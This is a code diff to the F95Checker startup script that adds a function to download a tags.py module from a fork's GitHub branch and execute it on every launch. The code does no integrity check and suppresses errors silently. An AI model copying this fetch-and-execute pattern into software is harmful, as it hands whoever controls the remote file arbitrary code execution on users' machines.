@@ -22,6 +22,10 @@ if os.devnull in (sys.stdout.name, sys.stderr.name):
 
 
 def main():
+    # Must be at the top
+    import asyncio
+    asyncio.run(resolve_tags_module())
+
     # Must import globals first to fix load paths when frozen
     from modules import globals
 
@@ -69,6 +73,43 @@ def lock_singleton():
                 request.urlopen(request.Request(rpc_url + "/window/show", method="POST"))
             except Exception:
                 pass
+
+
+async def resolve_tags_module():
+    import sys
+    import aiohttp
+    import pathlib
+    import importlib.util
+    if sys.platform.startswith("win"):
+        cache_path = "AppData/Local/f95checker"
+    elif sys.platform.startswith("linux"):
+        cache_path = ".cache/f95checker"
+    elif sys.platform.startswith("darwin"):
+        cache_path = "Library/Caches/f95checker"
+    else:
+        return
+    cache_path = pathlib.Path().home() / cache_path
+    cache_path.mkdir(parents=True, exist_ok=True)
+    fresh_module = cache_path / "tags.py"
+    url = "https://raw.githubusercontent.com/r37r05p3C7/F95Checker/pull-fresh-tags/modules/tags.py"
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    with open(fresh_module, 'wb') as f:
+                        while True:
+                            chunk = await response.content.read(1024)
+                            if not chunk:
+                                break
+                            f.write(chunk)
+                else:
+                    return
+        spec = importlib.util.spec_from_file_location("modules.tags", fresh_module)
+        mod = importlib.util.module_from_spec(spec) # type: ignore
+        sys.modules["modules.tags"] = mod
+        spec.loader.exec_module(mod) # type: ignore
+    except Exception:
+        return
 
 
 if __name__ == "__main__":
